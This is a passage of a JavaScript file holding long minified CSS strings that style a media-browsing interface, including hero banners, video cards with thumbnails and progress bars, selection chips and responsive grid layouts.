.nova-chip--active{background:rgba(255,255,255,.16);-webkit-box-shadow:inset 0 0 0 .09em rgba(255,255,255,.45);box-shadow:inset 0 0 0 .09em rgba(255,255,255,.45)}.nova-plus-root .nova-chip--active.focus{-webkit-box-shadow:0 .2em .7em rgba(0,0,0,.4);box-shadow:0 .2em .7em rgba(0,0,0,.4)}.nova-plus-root>.nova__rows>.nova-toolbar{margin:0 0 .85em 0;padding-left:.55em}.nova-plus.nova-plus-root>.nova__rows>.nova-drop{position:absolute!important;visibility:hidden;pointer-events:none;margin:0 0 .85em 0;padding-left:1.55em}.nova-plus.nova-plus-root .nova-plus__panel>.nova-drop{visibility:visible;pointer-events:auto}.nova-plus__bar{-webkit-flex-wrap:nowrap;-ms-flex-wrap:nowrap;flex-wrap:nowrap;margin:0 0 .85em 0;overflow:hidden;padding-right:.4em}.nova-plus__bar .nova-toolbar__label{font-size:.9em;margin:0 .48em 0 0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-plus__bar .nova-chip{padding:.35em .75em;margin:0 .75em 0 0;font-size:.95em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-plus__bar .nova-chip__label{font-size:1em}.nova-plus-root .nova__list>.nova-note{position:static!important;box-sizing:border-box;display:block!important;-webkit-flex:0 0 100%!important;-ms-flex:0 0 100%!important;flex:0 0 100%!important;width:100%!important;max-width:100%!important;height:auto!important;min-height:0!important;max-height:none!important;margin:0 0 1em 0!important;padding:.7em 1em!important;overflow:visible!important;align-self:flex-start!important;transform:none!important;font-size:1em!important;line-height:1.25!important;z-index:1!important}.nova-plus-root .nova__list>.nova-note .nova-note__main{display:block!important;position:static!important;max-width:100%!important;width:100%!important;height:auto!important;margin:0!important;padding:0!important}.nova-plus-root .nova__list>.nova-note .nova-note__title{display:block!important;position:static!important;font-size:1.05em!important;line-height:1.25!important;margin:0 0 .35em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}.nova-plus-root .nova__list>.nova-note .nova-note__text{display:block!important;position:static!important;font-size:.9em!important;line-height:1.3!important;margin:0 0 .6em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}.nova-plus-root .nova__list>.nova-note .nova-note__actions{display:flex!important;position:static!important;flex-wrap:wrap!important;align-items:center!important;gap:.45em!important;margin:0!important;height:auto!important}.nova-plus-root .nova__list>.nova-loading,.nova-plus-root .nova__list>.nova-skeleton{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;width:100%;max-width:100%;min-width:0;margin:0;padding:0 .55em}.nova-plus-root .nova__list>.nova-loading{-webkit-flex:1 1 auto;-ms-flex:1 1 auto;flex:1 1 auto;width:auto;max-width:none;padding:1.4em 1.6em;margin:0 .55em 1.1em .55em}.nova-plus-root .nova__list>.nova-skeleton{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.nova-plus-root .nova__list>.nova-skeleton>.nova-skeleton__row{display:block;-webkit-flex:0 0 20%;-ms-flex:0 0 20%;flex:0 0 20%;width:20%;max-width:20%;margin:0;padding:0 .55em 1.1em .55em;background:none;-webkit-border-radius:0;border-radius:0}.nova-plus-root .nova__list>.nova-skeleton .nova-skeleton__thumb{width:100%;height:auto;padding-top:56.25%;-webkit-border-radius:.55em;border-radius:.55em}.nova-plus-root .nova__list>.nova-skeleton .nova-skeleton__body{padding:.55em 0 0 0}.nova-plus-root .nova__list>.nova-skeleton .nova-skeleton__line{height:.8em;margin-bottom:.45em}.nova-plus-root .nova-plus__pane{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-transition:-webkit-transform .25s;transition:transform .25s}.nova-plus-root .nova-plus__hold-spacer{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;width:100%;visibility:hidden;pointer-events:none}.nova-plus-root .nova-plus__drop--scroll{overflow:hidden}.nova-plus-root .nova-drop{margin:0}.nova-plus-root .nova-plus__panel>.nova-drop{box-sizing:border-box;-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start}.nova-plus-root .nova-plus__pane{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;min-width:0;width:100%}.nova-plus__panel--swap>.nova-drop{margin:0 0 .2em 0}.nova-plus__panel--overlay{position:relative}.nova-plus__panel--overlay>.nova-plus__group{visibility:hidden}.nova-plus__panel--overlay>.nova-drop{z-index:4}.nova-plus__panel--note-source>.nova-drop{position:static!important;display:flex!important;visibility:visible;pointer-events:auto;width:100%;max-width:100%;height:auto!important;max-height:none;margin:.35em 0 .8em 0;padding-left:1em!important;z-index:auto}.nova-plus .nova__list>.nova-note{position:relative!important;box-sizing:border-box;display:block!important;flex:0 0 100%!important;width:100%!important;max-width:100%!important;min-width:0;min-height:0;margin:0 0 1em 0;padding:.7em 1em;overflow:visible!important;font-size:1em;line-height:1.25;z-index:1}.nova-plus .nova__list>.nova-note .nova-note__main{display:block;max-width:100%;margin:0;padding:0}.nova-plus .nova__list>.nova-note .nova-note__title{font-size:1.05em;line-height:1.25;margin:0 0 .35em 0;white-space:normal;overflow-wrap:anywhere}.nova-plus .nova__list>.nova-note .nova-note__text{font-size:.9em;line-height:1.3;margin:0 0 .6em 0;white-space:normal;overflow-wrap:anywhere}.nova-plus .nova__list>.nova-note .nova-note__actions{display:flex;flex-wrap:wrap;align-items:center;gap:.45em;margin:0}.nova-plus .nova__list>.nova-note .nova-btn{font-size:.95em;line-height:1.2;white-space:nowrap}.nova-plus-root .nova-note{position:relative!important;display:block!important;inset:auto!important;box-sizing:border-box!important;width:100%!important;max-width:100%!important;height:auto!important;min-height:0!important;max-height:none!important;margin:0 0 1em 0!important;padding:.7em 1em!important;overflow:visible!important;transform:none!important;font-size:1em!important;line-height:1.25!important;z-index:1!important}.nova-plus-root .nova-note__main{position:static!important;display:block!important;width:100%!important;max-width:100%!important;height:auto!important;margin:0!important;padding:0!important}.nova-plus-root .nova-note__title{position:static!important;display:block!important;font-size:1.05em!important;line-height:1.25!important;margin:0 0 .35em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}.nova-plus-root .nova-note__text{position:static!important;display:block!important;font-size:.9em!important;line-height:1.3!important;margin:0 0 .6em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}.nova-plus-root .nova-note__actions{position:static!important;display:flex!important;flex-wrap:wrap!important;align-items:center!important;gap:.45em!important;height:auto!important;margin:0!important}.nova-plus-root:has(.nova-plus__panel--note-source) .nova-note,.nova-plus-root.nova-plus--note-source .nova-note{display:none!important}.nova-plus-root:not(.nova-plus)>.nova__list{display:block!important;position:static!important;box-sizing:border-box!important;-webkit-flex:0 0 100%!important;-ms-flex:0 0 100%!important;flex:0 0 100%!important;width:100%!important;max-width:100%!important;min-width:0!important;margin:1.05em 0 0 0!important;padding:0!important;transform:none!important;overflow:visible!important}.nova-plus-root:not(.nova-plus)>.nova__list.nova__list--grid{display:-webkit-flex!important;display:-ms-flexbox!important;display:flex!important;-webkit-flex-wrap:wrap!important;-ms-flex-wrap:wrap!important;flex-wrap:wrap!important;-webkit-align-items:stretch!important;-ms-flex-align:stretch!important;align-items:stretch!important}.nova-plus-root:not(.nova-plus)>.nova__list>.nova-note{display:block!important;position:static!important;float:none!important;width:100%!important;max-width:100%!important;margin:0 0 1em 0!important}:is(.nova-skin-root,.nova-plus-root)>.nova__rows>.nova-drop{position:static!important;display:flex!important;visibility:visible!important;pointer-events:auto!important;width:100%!important;max-width:100%!important;height:auto!important;max-height:none!important;margin:0 0 .8em 0!important;padding-left:1em!important;z-index:auto!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note{position:static!important;box-sizing:border-box;display:block!important;flex:0 0 100%!important;width:100%!important;max-width:100%!important;height:auto!important;min-height:0!important;max-height:none!important;margin:0 0 1em 0!important;padding:.7em 1em!important;overflow:visible!important;transform:none!important;font-size:1em!important;line-height:1.25!important;z-index:1!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note .nova-note__main{display:block!important;position:static!important;width:100%!important;max-width:100%!important;height:auto!important;margin:0!important;padding:0!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note .nova-note__title{display:block!important;position:static!important;font-size:1.05em!important;line-height:1.25!important;margin:0 0 .35em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note .nova-note__text{display:block!important;position:static!important;font-size:.9em!important;line-height:1.3!important;margin:0 0 .6em 0!important;white-space:normal!important;overflow-wrap:anywhere!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note .nova-note__actions{display:flex!important;position:static!important;flex-wrap:wrap!important;align-items:center!important;gap:.45em!important;margin:0!important;height:auto!important}:is(.nova-skin-root,.nova-plus-root) .nova__list>.nova-note .nova-btn{font-size:.95em!important;line-height:1.2!important;white-space:nowrap!important}.nova-plus__panel--bottom>.nova-plus__bar{margin:.35em 0 0 0}.nova-plus__panel--bottom>.nova-plus__group:last-of-type{margin-bottom:0}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-chip.focus{background:#fff!important;color:#000!important;-webkit-box-shadow:none!important;box-shadow:none!important}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-chip.focus .nova-chip__sub{opacity:.6}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-chip.focus .nova-chip__badge{background:rgba(0,0,0,.12)!important;color:#000!important}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__body{background:#fff;color:#000;-webkit-border-radius:.45em;border-radius:.45em;padding:.3em .45em;margin:-.3em -.45em}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__descr,body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__voice{opacity:.75}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__head .nova-badge{background:rgba(0,0,0,.12)!important;color:#000!important;-webkit-box-shadow:none!important;box-shadow:none!important}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__tags>span{background:rgba(0,0,0,.1)!important;-webkit-box-shadow:none!important;box-shadow:none!important}body:not(.nova-plus-focus-ring) .nova-plus-root .nova-card--wide.focus .nova-card__thumb{-webkit-box-shadow:0 0 0 .16em #fff;box-shadow:0 0 0 .16em #fff}.nova-plus-root .nova__list{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin:0 -.55em;-webkit-transition:-webkit-transform .25s;transition:transform .25s}.nova-plus-root>.nova__list{padding:.4em 0 .6em .55em}.nova-plus-root .nova__list--row{-webkit-flex-wrap:nowrap;-ms-flex-wrap:none;flex-wrap:nowrap}.nova-plus-root .nova-card--wide{display:block;-webkit-flex:0 0 20%;-ms-flex:0 0 20%;flex:0 0 20%;width:20%;max-width:20%;margin:0;padding:0 .55em 1.1em .55em;background:none}.nova-plus-root .nova-card--wide.focus{background:none;color:inherit}.nova-plus-root .nova-card--wide .nova-card__thumb{position:relative;width:100%;height:auto;margin:0;padding-top:56.25%;overflow:hidden;-webkit-border-radius:.55em;border-radius:.55em;background:rgba(255,255,255,.07)}.nova-plus-root .nova-card--wide .nova-card__thumb img{position:absolute;top:0;left:0;width:100%;height:100%;-o-object-fit:cover;object-fit:cover}.nova-plus-root .nova-card--wide.focus .nova-card__thumb{-webkit-box-shadow:0 0 0 .16em #fff;box-shadow:0 0 0 .16em #fff}.nova-plus-root .nova-card--wide.focus .nova-card__thumb:after{content:\"\\25B6\";position:absolute;top:50%;left:50%;width:2em;height:2em;margin:-1em 0 0 -1em;z-index:3;-webkit-border-radius:50%;border-radius:50%;background:rgba(16,18,26,.55);color:#fff;font-size:1.05em;line-height:2em;text-align:center}.nova-plus-root .nova-card__tag{position:absolute;top:.4em;left:.45em;z-index:3;padding:.12em .4em;-webkit-border-radius:.3em;border-radius:.3em;font-size:.85em;font-weight:600;line-height:1.4}.nova-plus-root .nova-card__strip{position:absolute;left:.55em;right:.55em;bottom:.7em;padding-right:1.8em;z-index:2;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;font-size:.8em;text-shadow:0 .06em .2em rgba(0,0,0,.75)}.nova-plus-root .nova-card__pct{font-weight:600}.nova-plus-root .nova-card__strip>span{padding:.1em .38em;-webkit-border-radius:.3em;border-radius:.3em;line-height:1.45;text-shadow:none}.nova-plus-root .nova-chip--stack{-webkit-align-items:flex-start;-ms-flex-align:start;align-items:flex-start}.nova-plus-root .nova-drop .nova-chip__badge{background:rgba(255,255,255,.2);-webkit-box-shadow:none;box-shadow:none;-webkit-align-self:center;-ms-flex-item-align:center;align-self:center}.nova-plus-root .nova-chip__badge{-webkit-align-self:center;-ms-flex-item-align:center;align-self:center;margin-top:0}.nova-plus-root .nova-card--wide .nova-card__line{position:absolute;left:0;right:0;bottom:0;z-index:2;height:.22em;margin:0;background:rgba(255,255,255,.25)}.nova-plus-root .nova-card--wide .nova-card__body{padding:0}.nova-plus-root .nova-card__head{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin:.5em 0 .25em 0;font-size:.85em;opacity:.7}.nova-plus-root .nova-card__head>*{margin:0 .5em .1em 0}.nova-plus-root .nova-card__head .nova-badge{font-size:.85em;opacity:1}.nova-plus-root .nova-card__rate{font-weight:600;opacity:1}.nova-plus-root .nova-card__voice{min-width:0;max-width:100%;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;white-space:normal;word-break:break-word;opacity:.9}.nova-plus-root .nova-card--wide .nova-card__title{margin:0 0 .3em 0;font-size:1.05em;line-height:1.3;overflow:hidden;display:-webkit-box;-webkit-line-clamp:1;-webkit-box-orient:vertical}.nova-plus-root .nova-card__tags{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin:0 0 .35em 0}.nova-plus-root .nova-card__tags>span{margin:0 .3em .25em 0;padding:.1em .35em;-webkit-border-radius:.25em;border-radius:.25em;font-size:.72em;letter-spacing:.03em;line-height:1.5}.nova-plus-root .nova-card__tags>.nova-card__voice{background:none!important;-webkit-box-shadow:none!important;box-shadow:none!important;padding:.1em 0;margin:0 .3em .25em .15em;font-size:.82em;letter-spacing:0;line-height:1.5;opacity:.7}.nova-plus-root .nova-card--wide.nova-card--file .nova-card__thumb{width:100%;height:auto;padding-top:56.25%}.nova-plus-root .nova-card--wide.nova-card--file .nova-card__body{padding:0}.nova-plus-root .nova-card__descr{font-size:.85em;line-height:1.35;opacity:.5;overflow:hidden;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical}.nova-plus-root .nova-card--wide .nova-card__meta{font-size:.8em;opacity:.5}.nova-plus-root .nova-card__eye{position:absolute;top:.42em;right:.42em;left:auto;bottom:auto;z-index:3;width:1.28em;height:1.28em;padding:.12em;-webkit-border-radius:.32em;border-radius:.32em;background:rgba(10,11,17,.62);-webkit-box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.25);box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.25)}.nova-plus-root .nova-card__eye svg,.nova-plus-root .nova-card__viewed svg{width:100%;height:100%;display:block}.nova-plus-root .nova__list:not(.nova__list--grid) .nova-card:not(.nova-card--wide) .nova-card__side .nova-card__eye{position:static;display:block;top:auto;right:auto;left:auto;bottom:auto;z-index:auto;box-sizing:content-box;width:1.8em;height:1.8em;margin:.4em auto 0;padding:.15em .4em;font-size:.66em;line-height:1.4;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(255,255,255,.18);color:inherit;opacity:1!important;-webkit-box-shadow:none;box-shadow:none}.nova-plus-root .nova__list:not(.nova__list--grid) .nova-card:not(.nova-card--wide) .nova-card__side .nova-card__eye>svg{display:block;width:100%!important;height:100%!important;margin:0}.nova-plus-root .nova-card__viewed{top:auto;right:.42em;left:auto;bottom:.42em;z-index:3;width:1.28em;height:1.28em;padding:.12em;-webkit-border-radius:.32em;border-radius:.32em;background:rgba(10,11,17,.62);-webkit-box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.25);box-shadow:inset 0 0 0 .08em rgba(255,255,255,.08),0 .08em .28em rgba(0,0,0,.25)}.nova-plus-root .nova-card:not(.nova-card--wide) .nova-card__viewed{right:.95em}.nova-plus-root .nova-card--wide .nova-card__viewed{right:.55em;bottom:.58em}.nova-plus-root .nova-card--wide-nav,.nova-plus-root .nova-card--nav{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;width:100%;max-width:100%;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.nova-plus-root .nova-card--wide-nav .nova-card__thumb,.nova-plus-root .nova-card--nav .nova-card__thumb{-webkit-flex:0 0 7.2em;-ms-flex:0 0 7.2em;flex:0 0 7.2em;width:7.2em;height:4.05em;padding-top:0}.nova-plus-root .nova-card--wide-nav .nova-card__body,.nova-plus-root .nova-card--nav .nova-card__body{-webkit-flex:1 1 0%;-ms-flex:1 1 0%;flex:1 1 0%;min-width:0;padding:0 .8em}.nova-plus-root .nova-card--wide-nav .nova-card__title,.nova-plus-root .nova-card--nav .nova-card__title{-webkit-line-clamp:2}@media screen and (min-aspect-ratio:5/4) and (max-width:1200px){.nova-plus-root .nova-card--wide{-webkit-flex:0 0 20%;-ms-flex:0 0 20%;flex:0 0 20%;width:20%;max-width:20%}.nova-plus-root .nova-card__descr{-webkit-line-clamp:2}}@media screen and (min-aspect-ratio:5/4) and (max-width:820px){.nova-plus-root .nova-card--wide{-webkit-flex:0 0 33.3333%;-ms-flex:0 0 33.3333%;flex:0 0 33.3333%;width:33.3333%;max-width:33.3333%}}@media screen and (max-width:1100px) and (max-aspect-ratio:5/4){.nova-plus>.nova__hero,.nova-plus>.nova__rows{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;width:100%;max-width:100%;padding:0}.nova-plus>.nova__rows{margin-top:1em}.nova-plus>.nova-plus__strip{padding-left:0}.nova-plus-root .nova__list{margin-left:0;margin-right:0}.nova-plus-root>.nova__list{padding-left:0;padding-right:0}.nova-plus__bar{-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap}.nova-plus-root .nova-plus__panel--swap,.nova-plus-root .nova-plus__panel--overlay{min-height:0!important}.nova-plus-root .nova-plus__panel--swap>.nova-drop,.nova-plus-root .nova-plus__panel--overlay>.nova-drop{position:static!important;top:auto!important;left:auto!important;right:auto!important;width:100%!important;max-width:100%!important;height:auto!important;max-height:none!important;overflow:visible!important;z-index:auto!important;margin:.35em 0 .8em 0!important}.nova-plus-root .nova-plus__panel--swap>.nova-drop>.nova-plus__pane,.nova-plus-root .nova-plus__panel--overlay>.nova-drop>.nova-plus__pane{-webkit-transform:none!important;transform:none!important}.nova-plus-root .nova-plus__panel--overlay>.nova-plus__group{display:none!important}.nova-plus.nova-plus-root>.nova-plus__strip{position:static!important;top:auto!important}.nova-plus-root .nova-card--wide{-webkit-flex:0 0 33.3333%;-ms-flex:0 0 33.3333%;flex:0 0 33.3333%;width:33.3333%;max-width:33.3333%}}@media screen and (max-width:640px) and (max-aspect-ratio:5/4){.nova-plus-root .nova-card--wide{-webkit-flex:0 0 50%;-ms-flex:0 0 50%;flex:0 0 50%;width:50%;max-width:50%}.nova-plus-root .nova-card__descr{display:none}.nova-plus .nova-hero__title{max-width:100%}.nova-plus .nova-hero__hint{max-width:100%;-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%}}.nova-plus-root .nova__list--grid .nova-card:not(.nova-card--wide){width:20%;max-width:20%}.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{width:20%}@media screen and (max-width:860px){.nova-plus-root .nova__list--grid .nova-card:not(.nova-card--wide){width:33.3333%;max-width:33.3333%}.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{width:33.3333%}}@media screen and (max-width:580px){.nova-plus-root .nova__list--grid .nova-card:not(.nova-card--wide){width:50%;max-width:50%}.nova-plus-root .nova-skeleton--grid .nova-skeleton__row{width:50%}}";

  var SKIN_CSS = ".nova{padding:0 0 3em 0}.nova *{-webkit-box-sizing:border-box;box-sizing:border-box}.nova-hero{position:relative;overflow:hidden;-webkit-border-radius:1.2em;border-radius:1.2em;margin-bottom:1.7em;background:rgba(255,255,255,.06);min-height:13em}.nova-hero--compact{min-height:0;margin-bottom:1.3em}.nova-hero--compact .nova-hero__body{padding:1.1em 1.4em;max-width:100%;min-height:5.2em;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-orient:vertical;-webkit-box-direction:normal;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;-webkit-box-pack:center;-webkit-justify-content:center;-ms-flex-pack:center;justify-content:center}.nova-hero--compact .nova-hero__actions{margin:0}.nova-hero--compact .nova-btn--main{margin-bottom:0}.nova-hero--compact .nova-hero__season{margin:.6em 0 0 .2em;font-size:.95em;opacity:.55}.nova-hero--compact .nova-hero__progress{position:absolute;left:0;right:0;bottom:0;width:auto;height:.3em;margin:0;-webkit-border-radius:0;border-radius:0}.nova-hero--compact .nova-hero__shade{background:-webkit-linear-gradient(left,rgba(10,11,17,.88) 0%,rgba(10,11,17,.6) 45%,rgba(10,11,17,.15) 100%);background:linear-gradient(90deg,rgba(10,11,17,.88) 0%,rgba(10,11,17,.6) 45%,rgba(10,11,17,.15) 100%)}.nova-hero__bg{position:absolute;top:0;left:0;right:0;bottom:0}.nova-hero__bg img{display:block;width:100%;height:100%;-o-object-fit:cover;object-fit:cover;opacity:0;-webkit-transition:opacity .35s;transition:opacity .35s}.nova-hero__bg--loaded img{opacity:1}.nova-hero__shade{position:absolute;top:0;left:0;right:0;bottom:0;background:-webkit-linear-gradient(left,rgba(10,11,17,.9) 0%,rgba(10,11,17,.62) 32%,rgba(10,11,17,.2) 62%,rgba(10,11,17,0) 84%);background:linear-gradient(90deg,rgba(10,11,17,.9) 0%,rgba(10,11,17,.62) 32%,rgba(10,11,17,.2) 62%,rgba(10,11,17,0) 84%)}.nova-hero__body{position:relative;padding:2.2em;max-width:72%}.nova-hero__title{font-size:2.3em;font-weight:600;line-height:1.15;margin-bottom:.35em;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}.nova-hero__meta{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;font-size:1.1em;margin-bottom:.7em}.nova-hero__meta>*{margin:0 .7em .3em 0;opacity:.8}.nova-hero__meta>.nova-badge{opacity:1}.nova-hero__descr{font-size:1.05em;line-height:1.45;opacity:.65;margin-bottom:1.2em;overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical}.nova-hero__actions{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;min-width:0}.nova-hero__actions>.nova-btn{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;margin:0 .8em .4em 0}.nova-hero__hint{font-size:1em;line-height:1.5;opacity:.55;margin:0;padding:.1em .15em;overflow:hidden;white-space:nowrap;-o-text-overflow:ellipsis;text-overflow:ellipsis;min-width:0;-webkit-box-flex:1;-webkit-flex:1 1 14em;-ms-flex:1 1 14em;flex:1 1 14em}.nova-hero__progress{position:absolute;left:0;right:0;bottom:0;height:.3em;width:auto;-webkit-border-radius:0;border-radius:0;background:rgba(255,255,255,.2);margin:0;overflow:hidden}.nova-hero__progress .time-line{display:block !important;height:100%;margin:0;background:none}.nova-hero__progress .time-line>div{height:100%;background:#fff}.nova-badge{display:inline-block;padding:.2em .55em;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(255,255,255,.18);font-size:.78em;font-weight:600;letter-spacing:.04em;line-height:1.4}.nova-btn{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.7em 1.5em;-webkit-border-radius:2.4em;border-radius:2.4em;background:rgba(255,255,255,.12);font-size:1.15em;white-space:nowrap;margin:0 .8em .5em 0}.nova-btn>svg{width:1.15em;height:1.15em;margin-right:.6em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-btn.focus{background:#fff;color:#000}.nova-btn--main{background:rgba(255,255,255,.82);color:#000}.nova-btn--main.focus{background:#fff;-webkit-box-shadow:0 .25em .9em rgba(0,0,0,.45);box-shadow:0 .25em .9em rgba(0,0,0,.45)}.nova-btn--ghost{background:rgba(255,255,255,.14);font-size:1.05em}.nova-section{margin-bottom:1.1em}.nova-section__title{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;font-size:.95em;letter-spacing:.12em;text-transform:uppercase;opacity:.5;margin-bottom:.7em}.nova-section__title:before{content:\"\";display:inline-block;width:.25em;height:1.1em;background:currentColor;margin-right:.6em;-webkit-border-radius:.2em;border-radius:.2em}.nova-section__body{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.nova-chip{position:relative;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;padding:.55em 1.1em;-webkit-border-radius:2em;border-radius:2em;background:rgba(255,255,255,.07);margin:0 .7em .7em 0;font-size:1.05em;white-space:nowrap;max-width:24em}.nova-chip.focus{background:#fff;color:#000}.nova-chip--active{background:rgba(255,255,255,.16);-webkit-box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5);box-shadow:inset 0 0 0 .1em rgba(255,255,255,.5)}.nova-chip--active.focus{-webkit-box-shadow:0 .2em .7em rgba(0,0,0,.4);box-shadow:0 .2em .7em rgba(0,0,0,.4)}.nova-chip__idx{font-size:.85em;opacity:.45;margin-right:.55em}.nova-chip__badge{font-size:.7em;font-weight:600;padding:.2em .45em;-webkit-border-radius:.35em;border-radius:.35em;background:rgba(255,255,255,.2);margin-right:.6em;line-height:1.4}.nova-chip.focus .nova-chip__badge{background:rgba(0,0,0,.12)}.nova-chip--more{opacity:.75}.nova-chip__label{line-height:1.5;padding:.05em .1em;overflow:hidden;-o-text-overflow:ellipsis;text-overflow:ellipsis;min-width:0}.nova-chip>svg{width:1em;height:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-chip__label+svg{margin-left:.6em;opacity:.6}.nova-chip>svg:first-child{margin-right:.55em;opacity:.7}.nova-chip--source{font-size:1.15em;padding:.5em 1.1em}.nova-chip--ghost{opacity:.5}.nova-chip--busy .nova-chip__label{opacity:.5}.nova-chip__dot{width:.5em;height:.5em;-webkit-border-radius:50%;border-radius:50%;margin-left:.6em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;background:#4ade80}.nova-chip--checking{opacity:.55}.nova-chip--empty{opacity:.35}.nova-toolbar{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:nowrap;-ms-flex-wrap:nowrap;flex-wrap:nowrap;-webkit-box-align:center;-webkit-align-items:center;-ms-flex-align:center;align-items:center;margin-bottom:1em;min-width:0;overflow:hidden}.nova-toolbar>*{margin-bottom:0;vertical-align:middle}.nova-toolbar .nova-chip{-webkit-flex-shrink:1;-ms-flex-negative:1;flex-shrink:1;min-width:4.5em;margin-bottom:0}.nova-toolbar__label{font-size:.95em;letter-spacing:.12em;text-transform:uppercase;opacity:.45;margin:0 .9em 0 0;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0}.nova-toolbar--tight{font-size:.95em}.nova-toolbar--tight .nova-toolbar__label{display:none}.nova-toolbar--tight .nova-chip{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;max-width:none;padding:.5em 1em;margin-right:.6em}.nova-toolbar--tighter{font-size:.85em}.nova-toolbar--tighter .nova-toolbar__label{display:none}.nova-toolbar--tighter .nova-chip{-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;max-width:none;padding:.45em .85em;margin-right:.5em}.nova-toolbar--tighter .nova-chip__badge{margin-right:.4em}.nova-toolbar .nova-btn--main{margin:0 1.4em 0 0;font-size:1.1em;padding:.55em 1.3em}.nova-toolbar 